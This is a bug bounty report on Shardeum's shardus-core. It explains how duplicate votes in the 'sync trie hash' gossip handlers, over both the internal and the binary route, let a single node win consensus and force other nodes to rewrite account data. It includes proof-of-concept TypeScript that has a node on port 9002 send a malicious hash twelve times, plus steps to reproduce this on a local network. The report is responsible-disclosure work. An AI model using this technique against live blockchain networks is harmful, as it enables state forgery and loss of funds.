# 34020 - \[BC - Critical] An alternative entry point with a separated but...

## An alternative entry point with a separated but vulnerable implementation allows to bypass the consensus system and modify account data

Submitted on Aug 4th 2024 at 10:23:51 UTC by @infosec\_us\_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34020

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Direct loss of funds

### Description

2 routes listen to "sync trie hash" requests: the `Binary` route and the `Internal` route.

```
┌───────────────────────┐     
│Gossip "sync trie hash"│     
└┬─────────────┬────────┘     
┌▽───────────┐┌▽─────────────┐
│Binary Route││Internal Route│
└────────────┘└──────────────┘
```

The server is configured to spread "sync trie hash" requests using the binary gossip route:

```
┌──────────────────┐
│Notify nodes using│
└┬─────────────────┘
┌▽───────────┐      
│Binary Route│      
└────────────┘      

```

However, the codebase given to us to audit not only listens to these requests using the Binary Route but also using the internal route.

```
┌───────────────┐             
│Listen using   │             
└┬─────────────┬┘             
┌▽───────────┐┌▽─────────────┐
│Binary Route││Internal Route│
└────────────┘└──────────────┘

```

What we often see in the Shardus codebase is that different routes (binary and internals) decode the message and call a function with the implementation for that route, like this:

```
┌────────────────────────────────┐                          
│Listen using                    │                          
└┬──────────────────────────────┬┘                          
┌▽────────────────────────────┐┌▽──────────────────────────┐
│Internal Route "DO SOMETHING"││Binary Route "DO SOMETHING"│
└┬────────────────────────────┘└┬──────────────────────────┘
┌▽──────────────────────────────▽─┐                         
│Implementation for "DO SOMETHING"│                         
└─────────────────────────────────┘                         
```

This way, if a bug is found in the function that implements "DO SOMETHING", fixing that function will fix the issue for all routes at the same time.

Unfortunately, that is not the case for the implementation of the "sync trie hash" operation.

There are 2 routes, `binary_sync_trie_hashes` and `sync_trie_hashes`, and instead of pointing to the same function that implements the syncing process, they have 2 separate implementations:

```
┌───────────────┐                                                                 
│Listen using   │                                                                 
└┬─────────────┬┘                                                                 
┌▽───────────┐┌▽──────────────────────────┐                                       
│Binary Route││Internal Route             │                                       
└┬───────────┘└──────────────────────────┬┘                                       
┌▽─────────────────────────────────────┐┌▽───────────────────────────────────────┐
│Binary "sync trie hash" implementation││Internal "sync trie hash" implementation│
└──────────────────────────────────────┘└────────────────────────────────────────┘
```

In our previous report with ID **33972**, our team discovered how to exploit the "sync trie hash" in one of the routes to inflate the votes of the hash for a malicious trie data structure to bypass the consensus system and modify account data, which causes loss of funds.

Was today when we discovered that both implementations are written separately and that the same bug in the **internal implementation** of "sync trie hash", exists in the **binary implementation** of "sync trie hash", therefore fixing the vulnerability in one of them does not fix it in the other.

```
┌───────────────┐                                                                 
│Listen using   │                                                                 
└┬─────────────┬┘                                                                 
┌▽───────────┐┌▽──────────────────────────┐                                       
│Binary Route││Internal Route             │                                       
└┬───────────┘└──────────────────────────┬┘                                       
┌▽─────────────────────────────────────┐┌▽───────────────────────────────────────┐
│Binary "sync trie hash" implementation││Internal "sync trie hash" implementation│
└┬─────────────────────────────────────┘└┬───────────────────────────────────────┘
┌▽─────────────┐┌────────────────────────▽┐                                       
│BUG FIXED HERE││STILL VULNERABLE HERE    │                                       
└──────────────┘└─────────────────────────┘                                       
```

As fixing the bug in a function does not fix the bug in the other function, we are submitting two separate reports, one for each vulnerable function.

### Brief/Intro

In Shardeum, no single node stores the entire state of the blockchain. A dynamic sharding system is used and the address space is divided into multiple shards, each managed by a different set of nodes.

The Shardeum network utilizes a consensus system where nodes vote on the hash of the trie data structure managed by their shard, once they agree on the data it becomes part of the next cycle.

In this report, we demonstrate how a single node in a shard can create a malicious trie data structure and inflate its hash's votes by any amount until it wins the consensus.

As a result, all nodes will try to "repair" their data based on the hash that won the consensus. In other words, a single node can modify the state of the blockchain assigned to his shard.

> Bypassing the consensus system to modify the state of the blockchain creates a loss of funds.

### Vulnerability Details

After each tree computation, the correct radix and hashes are sent out to other nodes using the function `broadcastSyncHashes(...)`.

> Function broadcastSyncHashes(...): <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L3085>

Internal and binary gossip handlers are responsible for syncing those trie hashes between nodes in the network, adding votes to the hashTrieSyncConsensus with every gossip received.

> Internal handler with its own implementation: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L696-L767>
>
> Binary handler with its own implementation: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L769-L846>
>
> Both of them are written separately, both of them are vulnerable, and they both must be manually fixed.

When adding a vote for a hash, the public key of the node that is voting is saved, but unfortunately, it is not used to prevent the same node from voting multiple times.

An attacker node can distribute the hash of a malicious data structure and vote an unlimited amount of times within seconds to always win the consensus.

After a few seconds, the `testAndPatchAccounts` function is called to test if the node is in sync on all accounts and to repair data if it is not. This repair process looks for a tree data structure that matches the hash that won the consensus, in this case, a hash for a malicious tree data structure.

### Impact Details

Bypassing the consensus system to modify the state of the blockchain creates a loss of funds.

### Proof of Concept

Download locally Shardus Core repo and Shardeum's repo locally.

Apply the following patch to the Shardeum repo:

```
git apply debug-10-nodes.patch
```

Now point Shardeum to use the local copy of Shardu's Core as instructed in the README.md file of Shardeum's codebase.

In your local copy of Shardeum, open the file `src/state-manager/AccountPatcher.ts` and replace the following snippet of code from L3227 to L3228:

```
        const promise = this.p2p.tell([messageEntry.node], 'sync_trie_hashes', messageEntry.message)
        promises.push(promise)
```

> Snippet of code from: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L3227-L3228>

With this one:

```
        // HACK: INFOSEC
        // if we are 9002 (evil node) send a malicious hash and vote for it 12 times in a row
        // if we are not 9002 proceed as usual
        if (Self.getThisNodeInfo().externalPort == 9002) {
          console.log(`INFOSEC: Dup votes sent via internal`);
          let evilMessage = messageEntry.message;
          for (let i = 0; i < evilMessage.nodeHashes.length; i++) {
            evilMessage.nodeHashes[i].hash = `helloWorld${i}`;
          }
          for (let a = 0; a < 12; a++) {
            const promise = this.p2p.tell([messageEntry.node], 'sync_trie_hashes', evilMessage)
            promises.push(promise)
          }
        } else {
          const promise = this.p2p.tell([messageEntry.node], 'sync_trie_hashes', messageEntry.message)
          promises.push(promise)
        }
```

Then replace the following snippet of code from L3216 to L3223:

```
        const promise = this.p2p.tellBinary<SyncTrieHashesRequest>(
          [messageEntry.node],
          InternalRouteEnum.binary_sync_trie_hashes,
          syncTrieHashesRequest,
          serializeSyncTrieHashesReq,
          {}
        )
        promises.push(promise)
```

> Code snippet from: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L3216-L3223>

With this:

```
        // HACK: INFOSEC
        // if we are 9002 (evil node) send a malicious hash and vote for it 12 times in a row
        // if we are not 9002 proceed as usual
        if (Self.getThisNodeInfo().externalPort == 9002) {
          console.log(`INFOSEC: Dup votes sent via binary`);
          for (let i = 0; i < syncTrieHashesRequest.nodeHashes.length; i++) {
            syncTrieHashesRequest.nodeHashes[i].hash = `helloWorld${i}`;
          }

          for (let a = 0; a < 12; a++) {
            const promise = this.p2p.tellBinary<SyncTrieHashesRequest>(
              [messageEntry.node],
              InternalRouteEnum.binary_sync_trie_hashes,
              syncTrieHashesRequest,
              serializeSyncTrieHashesReq,
              {}
            )
            promises.push(promise)
          }
        } else {
          const promise = this.p2p.tellBinary<SyncTrieHashesRequest>(
            [messageEntry.node],
            InternalRouteEnum.binary_sync_trie_hashes,
            syncTrieHashesRequest,
            serializeSyncTrieHashesReq,
            {}
          )
          promises.push(promise)
        }
```

With these changes, we have modified the node to do the following:

* If the current node executing the code is NOT running in port 9002, then is going to be a legit/good node and it will run as usual. No modifications are made to these nodes, they will gossip the correct hashes.
* If the current node executing the code IS running in port 9002, then is going to be a malicious node, that will gossip a malicious hash and inflate its votes in the consensus system until it wins v.s. the correct/legit hash, and forces the network to "repair" their data.

Now build both codebases, and start the network with 10 nodes using shardus's CLI (shardus start 10)

Wait until cycle 16 before proceeding with the next step. All nodes should be active and synced by cycle 16.

Finally, go to the log file at ./instances/shardus-instance-9004/logs/fatal.log and it will be filled with errors about not being in sync and having bad accounts.

A huge dump asking to repair all data accounts can be found in ./instances/shardus-instance-9004/logs/main.log - is too big to paste here.

## Conclusion

In this POC we prove how to bypass the consensus system and fool the network into believing they have the wrong data state and must repair the accounts data with "the correct" trie data structure.
